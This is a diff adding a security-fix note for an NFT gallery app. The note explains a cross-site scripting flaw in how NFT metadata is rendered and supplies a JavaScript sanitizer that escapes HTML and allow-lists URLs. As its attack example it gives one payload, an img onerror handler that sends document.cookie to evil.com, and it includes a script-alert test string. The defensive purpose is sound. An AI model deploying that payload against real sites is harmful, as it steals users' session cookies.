@@ -1,0 +1,90 @@
+CRITICAL SECURITY FIX: Prevent XSS attacks from malicious NFT metadata
+
+PROBLEM: The app renders NFT metadata (name, description, traits) directly into HTML using template literals and innerHTML. If a malicious actor creates an NFT with JavaScript in the name field, it will execute in users' browsers.
+
+Example attack: An NFT with name: "<img src=x onerror='document.location=\"http://evil.com/steal?\"+document.cookie'>"
+
+SOLUTION: Create a sanitization utility and apply it everywhere external data is rendered.
+
+1. Create utils/sanitize.js:
+
+const Sanitizer = {
+  // Escape HTML entities to prevent XSS
+  escapeHtml(unsafe) {
+    if (unsafe === null || unsafe === undefined) return '';
+    return String(unsafe)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#039;');
+  },
+  
+  // Validate and sanitize URLs (only allow https and ipfs)
+  sanitizeUrl(url) {
+    if (!url || typeof url !== 'string') return '';
+    const trimmed = url.trim();
+    
+    // Only allow safe protocols
+    if (trimmed.startsWith('https://') || 
+        trimmed.startsWith('ipfs://') ||
+        trimmed.startsWith('data:image/')) {
+      return trimmed;
+    }
+    
+    // Convert IPFS hash to gateway URL
+    if (trimmed.startsWith('Qm') || trimmed.startsWith('bafy')) {
+      return `https://ipfs.io/ipfs/${trimmed}`;
+    }
+    
+    return ''; // Block all other URLs
+  },
+  
+  // Sanitize entire metadata object
+  sanitizeMetadata(metadata) {
+    if (!metadata || typeof metadata !== 'object') {
+      return { name: '', description: '', image: '', attributes: [] };
+    }
+    
+    return {
+      name: this.escapeHtml(metadata.name || ''),
+      description: this.escapeHtml(metadata.description || ''),
+      image: this.sanitizeUrl(metadata.image || ''),
+      external_url: this.sanitizeUrl(metadata.external_url || ''),
+      attributes: Array.isArray(metadata.attributes) 
+        ? metadata.attributes.map(attr => ({
+            trait_type: this.escapeHtml(attr.trait_type || ''),
+            value: this.escapeHtml(String(attr.value ?? ''))
+          }))
+        : []
+    };
+  },
+  
+  // Sanitize wallet address
+  sanitizeAddress(address) {
+    if (!address || typeof address !== 'string') return '';
+    // Ethereum addresses are 42 chars: 0x + 40 hex
+    if (/^0x[a-fA-F0-9]{40}$/.test(address)) {
+      return address;
+    }
+    return '';
+  }
+};
+
+window.Sanitizer = Sanitizer;
+
+2. Update ALL places where metadata is rendered to use Sanitizer:
+
+// BEFORE (vulnerable):
+const name = metadata?.name || `Based Guardian #${tokenId}`;
+
+// AFTER (secure):
+const sanitizedMetadata = Sanitizer.sanitizeMetadata(metadata);
+const name = sanitizedMetadata.name || `Based Guardian #${tokenId}`;
+const image = sanitizedMetadata.image || 'placeholder.png';
+
+3. Apply to createMintCard, createNFTCard, and any other render functions.
+
+4. Test by trying to create/display an NFT with this name:
+   <script>alert('XSS')</script>
+   It should display as text, not execute.
